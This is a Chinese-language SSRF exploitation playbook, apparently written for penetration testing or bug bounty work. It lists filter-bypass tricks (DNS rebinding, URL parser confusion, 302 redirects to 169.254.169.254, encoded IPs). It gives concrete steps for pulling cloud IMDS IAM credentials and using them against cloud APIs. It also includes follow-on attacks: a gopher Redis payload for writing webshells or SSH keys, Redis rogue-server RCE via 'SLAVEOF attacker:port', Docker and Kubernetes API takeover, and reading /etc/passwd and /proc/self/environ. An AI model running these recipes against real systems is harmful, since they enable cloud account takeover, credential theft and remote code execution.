## 一、漏洞确认 | 确认输入的功能范围

1. **协议能力**:试 `http/https`(基本)、`file://`(读本地文件)、`gopher://`/`dict://`(访问内网 TCP)——发各协议探针看响应差异,判服务端支持哪些
2. **回显程度**:发外部 url,看响应——全回显(正文)/ 部分回显(标题摘要)/ 只状态码或响应头 / 无回显(blind)。blind 靠 dnslog(dnslog.cn / ceye.io / interact.sh)或自建 web 服务接回连:没 dnslog 时 `ssh Tfo0 'nohup python3 -m http.server 8000 >/tmp/ssrf.log 2>&1 &'`,url 指 `http://<该机公网IP/域名>:8000/x`,看 `ssh Tfo0 'cat /tmp/ssrf.log'` 来没来,完事 `ssh Tfo0 'pkill -f http.server'`
3. **url 约束**:任意 url?还是白名单固定域名?(白名单→走绕过段)

## 二、绕过思路 | 先推测后端校验逻辑,再按根因四类对症 | 只给思路,自由发挥

- **1. 校验≠请求主机**(校验层和请求层解析出不同 host):
  - **DNS 重绑定**:自己域名 TTL=0,校验时解析公网放行、请求时解析内网(`1u.ms` / `nip.io` / `sslip.io` / rebinder)。
  - **解析差异**:推测后端校验正则(黑名单/白名单前缀/子串),反推构造过正则但请求层 host 分歧的串——`@`(`http://allowed@evil`,校验看 allowed 实际请求 evil)、`#`(`http://evil#allowed`,fragment 后)、`//`/`\`/`/@`、大小写(`HTTP://`)、URL 编码(`%6cocalhost`→`localhost`);urllib2/requests/urllib/Java 解析各不同。白名单前缀 `^http://allowed` 用 `@`/子域(`allowed.evil`)绕;白名单子串含 `allowed` 用塞 query(`evil?allowed`)/path(`evil/allowed`)/`#@` 绕。
- **2. 302 重定向**(校验放行首跳,redirect 把 fetch 导到内网):
  - **白名单域名自带 302**:r3dir(`302.r3dir.me` 直跳云元数据 / `307.r3dir.me` 保方法)、或白名单域上的开放重定向(`allowed.com/redirect?url=`)。
  - **可控 302 域名**:自己开桶配回源(对象不存在→你服务器拉),你服务器回 `302 → http://169.254.169.254/...`;或自己 HTTP 服务器直接 302——域名无害过校验,SSRF 目标跟跳到内网。
  - *(302 附加:改方法——IMDS 仅 GET,302 让 POST→GET;改协议——自己站 302 把 http→https 绕协议白名单。)*
- **3. 编码绕黑名单**(host 就是内网,黑名单正则认不出):
  - **IP 格式**:十进制 `2130706433`、八进制 `0177.0.0.1`、十六进制 `0x7f000001`、简写 `127.1`、IPv6 `[::1]`/`[::ffff:127.0.0.1]`、`0.0.0.0`/`0`、CIDR `127.0.0.0/8`。
  - **unicode/全角**:全角数字、unicode 表示的 localhost。
  - **URL 编码/双重编码**:`%6c`→`l`、双重 `%25%36%63`。
- **4. 协议层**(校验 protocol ≠ 请求 protocol):
  - **大小写/形态**:`HTTP://`、协议相对 `//evil`、无斜杠 `http:evil`。
  - **试别的协议**:`file://`(读本地文件)、`gopher://`/`dict://`(访问内网 TCP)。

## 三、漏洞证明 | 不准内网横向 只允许获取key进行验证

- **云元数据(核心,证接管)**:请求 IMDS 拿 IAM 凭证——
  - AWS `169.254.169.254/latest/meta-data/iam/security-credentials/`
  - 国内云 `100.100.100.200/latest/meta-data/ram/security-credentials/`
  - GCP `metadata.google.internal/computeMetadata/v1/`(加 `Metadata-Flavor` 头)
  - Azure `169.254.169.254/metadata/instance?api-version=2021-02-01`(加头 `Metadata: true`,不像 AWS 有 IMDSv2,但必须这头才返)
  - IMDSv2(AWS 新实例):先 `PUT /latest/api/token` 拿 token,带 `X-aws-ec2-metadata-token` 头再请求;国内云/GCP 类似要 token 或特定头,直接请求 401 先试拿 token
  - 钥匙路径差:先读角色名(`cam/security-credentials/` 列表),取钥匙 `cam/security-credentials/角色名` 常 404,**必须再请求** `cam/service-role-security-credentials/角色名`(按 AWS `iam/` 菜谱在 404 停 = 漏钥匙)
  - 回环 403 / `Forbidden Loopback` ≠ 元数据也拦:只拦回环字符串、不按解析后 IP 再拦云元数据域名,继续请求
  - 匿名网关当入口:演示/匿名 token 不当"已登录",带它请求 `*proxy*` 的 url 参;固定 POST 代理直接请求元数据 405(IMDS 仅接受 GET)≠ 没洞,先公网 302 把 Location 指云元数据让代理跟跳改 GET
  - GOPROXY 跟 VCS(拉元数据入口):`go-import` 用 **hg** + 厂商元数据域名(git HTTPS 常超时),hg 跟 VCS 时拉元数据/钥匙
  - 拿到 `TmpSecretId` + `TmpSecretKey` + `Token`,**用 apikey 连接云 API 证明接管**:`GetCallerIdentity` 对上主账号(ListBuckets 403 别停,再签 CLS `DescribeConfigs` 看采集配置/主题也算)
- **其他危害**:访问到内网服务——gopher Redis 写 webshell/计划任务/写 `~/.ssh/authorized_keys`(gopherus 生成;示例 `gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A`)/ Redis 4.x 主从同步 RCE(rogue server:`SLAVEOF attacker:port` 推 `.so` → `MODULE LOAD exp.so` → `system.exec('id')`)/ Docker API(2375 挂载根→RCE)/ k8s API(6443/10250 创 pod)/ blind 探测 Elasticsearch·Jenkins·Consul·Weblogic·Confluence·Jira·Solr·Druid·Memcache·Tomcat;file 读敏感文件 `/etc/passwd`、`/proc/self/environ`(含密钥)、`.env`/config

## 四、误报场景

- 只回显 instance-id / 钥匙 404 / 调不通 = 元数据通了但没拿到能用的钥匙,不算接管——查钥匙路径(`cam/service-role-security-credentials/` 非 `cam/security-credentials/`),404 别停换路径
- 能 ListBuckets 列桶名但没调通云 API = 匿名/只读列桶 ≠ 接管全账号,要钥匙 + `GetCallerIdentity` 对上主账号才算
- GOPROXY 没拉到钥(go-get 没触发 / hg 不跟)= 这入口未命中,换入口再证
